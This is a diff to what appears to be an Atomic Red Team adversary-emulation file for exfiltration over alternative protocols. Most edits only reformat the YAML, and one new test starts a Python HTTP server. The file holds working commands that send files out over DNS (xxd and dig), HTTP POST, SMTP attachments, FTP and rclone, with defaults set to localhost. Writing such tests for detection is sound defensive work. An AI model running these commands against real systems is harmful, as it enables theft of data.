@@ -37,11 +37,11 @@ atomic_tests:
   input_arguments:
     input_file:
       description: Path to file to be exfiltrated.
-      type: Path
+      type: path
       default: C:\Windows\System32\notepad.exe
     ip_address:
       description: Destination IP address where the data should be sent.
-      type: String
+      type: string
       default: 127.0.0.1
   executor:
     command: |
@@ -64,57 +64,57 @@ atomic_tests:
           xxd -p input_file > encoded_data.hex | for data in `cat encoded_data.hex`; do dig $data.domain; done
           
       3. Once the data is received, use the below command to recover the data.
-      
+
           cat output_file | cut -d "A" -f 2 | cut -d " " -f 2 | cut -d "." -f 1 | sort | uniq | xxd -p -r
     name: manual
 - name: Exfiltration Over Alternative Protocol - HTTP
   auto_generated_guid: 6aa58451-1121-4490-a8e9-1dada3f1c68c
   description: |
-     Exfiltration of specified file over HTTP.
-     Upon successful execution, powershell will invoke web request using POST method to exfiltrate notepad.exe to a remote address (default http://127.0.0.1). Results will be via stdout.
+    Exfiltration of specified file over HTTP.
+    Upon successful execution, powershell will invoke web request using POST method to exfiltrate notepad.exe to a remote address (default http://127.0.0.1). Results will be via stdout.
   supported_platforms:
   - windows
   executor:
     command: |
-     $content = Get-Content #{input_file}
-     Invoke-WebRequest -Uri #{ip_address} -Method POST -Body $content
+      $content = Get-Content #{input_file}
+      Invoke-WebRequest -Uri #{ip_address} -Method POST -Body $content
     name: powershell
   input_arguments:
     input_file:
       description: Path to file to exfiltrate
-      type: Path
+      type: path
       default: C:\Windows\System32\notepad.exe
     ip_address:
       description: Destination IP address where the data should be sent
-      type: String
+      type: string
       default: http://127.0.0.1
 - name: Exfiltration Over Alternative Protocol - SMTP
   auto_generated_guid: ec3a835e-adca-4c7c-88d2-853b69c11bb9
   description: |
-     Exfiltration of specified file over SMTP.
-     Upon successful execution, powershell will send an email with attached file to exfiltrateto a remote address. Results will be via stdout.
+    Exfiltration of specified file over SMTP.
+    Upon successful execution, powershell will send an email with attached file to exfiltrateto a remote address. Results will be via stdout.
   supported_platforms:
   - windows
   executor:
     command: |
-     Send-MailMessage -From #{sender} -To #{receiver} -Subject "T1048.003 Atomic Test" -Attachments #{input_file} -SmtpServer #{smtp_server}
+      Send-MailMessage -From #{sender} -To #{receiver} -Subject "T1048.003 Atomic Test" -Attachments #{input_file} -SmtpServer #{smtp_server}
     name: powershell
   input_arguments:
     input_file:
       description: Path to file to exfiltrate
-      type: Path
+      type: path
       default: C:\Windows\System32\notepad.exe
     sender:
       description: The email address of the sender
-      type: String
+      type: string
       default: "test@corp.com"
     receiver:
       description: The email address of the receiver
-      type: String
+      type: string
       default: "test@corp.com"
     smtp_server:
       description: SMTP server to use for email transportation
-      type: String
+      type: string
       default: "127.0.0.1"
 - name: MAZE FTP Upload
   auto_generated_guid: 57799bc2-ad1e-4130-a793-fb0c385130ba
@@ -127,15 +127,15 @@ atomic_tests:
   input_arguments:
     ftp_server:
       description: FTP Server address
-      type: String
+      type: string
       default: 127.0.0.1
     username:
       description: Username for FTP server login
-      type: String
+      type: string
       default:
     password:
       description: Password for FTP server login
-      type: String
+      type: string
       default:
   executor:
     command: |
@@ -151,13 +151,13 @@ atomic_tests:
       else
       {echo "FTP Server Unreachable. Please verify the server address in input args and try again."}
     cleanup_command: |
-     $ftp = "ftp://#{ftp_server}/"
-     try {foreach ($file in (dir "$env:windir\temp" "*.7z"))
-     {$uri = New-Object System.Uri($ftp+$file.name)
-      $ftp_del = [System.Net.FtpWebRequest]::create($uri)
-      $ftp_del.Credentials = New-Object System.Net.NetworkCredential('#{username}','#{password}')
-      $ftp_del.Method = [System.Net.WebRequestMethods+Ftp]::DeleteFile
-      $ftp_del.GetResponse()}} catch{}
+      $ftp = "ftp://#{ftp_server}/"
+      try {foreach ($file in (dir "$env:windir\temp" "*.7z"))
+      {$uri = New-Object System.Uri($ftp+$file.name)
+       $ftp_del = [System.Net.FtpWebRequest]::create($uri)
+       $ftp_del.Credentials = New-Object System.Net.NetworkCredential('#{username}','#{password}')
+       $ftp_del.Method = [System.Net.WebRequestMethods+Ftp]::DeleteFile
+       $ftp_del.GetResponse()}} catch{}
     name: powershell
 - name: Exfiltration Over Alternative Protocol - FTP - Rclone
   auto_generated_guid: b854eb97-bf9b-45ab-a1b5-b94e4880c56b
@@ -189,10 +189,10 @@ atomic_tests:
       Check if the exfil package exists
     prereq_command: |
       if (Test-Path C:\Users\Public\Downloads\exfil.zip) {exit 0} else {exit 1}
-    get_prereq_command: | 
+    get_prereq_command: |
       fsutil file createnew C:\Users\Public\Downloads\exfil.zip 20485760
   - description: 'Check if rclone zip exists'
-    prereq_command: | 
+    prereq_command: |
       if (Test-Path C:\Users\Public\Downloads\rclone-current-windows-amd64.zip) {exit 0} else {exit 1}
     get_prereq_command: |
       Invoke-WebRequest -Uri "https://downloads.rclone.org/rclone-current-windows-amd64.zip" -OutFile "C:\Users\Public\Downloads\rclone-current-windows-amd64.zip"
@@ -205,3 +205,14 @@ atomic_tests:
       &$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate
     name: powershell
     elevation_required: true
+- name: Python3 http.server
+  auto_generated_guid: 3ea1f938-f80a-4305-9aa8-431bc4867313
+  description: |
+    An adversary may use the python3 standard library module http.server to exfiltrate data. This test checks if python3 is available and if so, creates a HTTP server on port 9090, captures the PID, sleeps for 10 seconds, then kills the PID and unsets the $PID variable.
+  supported_platforms:
+  - linux
+  executor:
+    name: sh
+    elevation_required: false
+    command: |
+      if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi
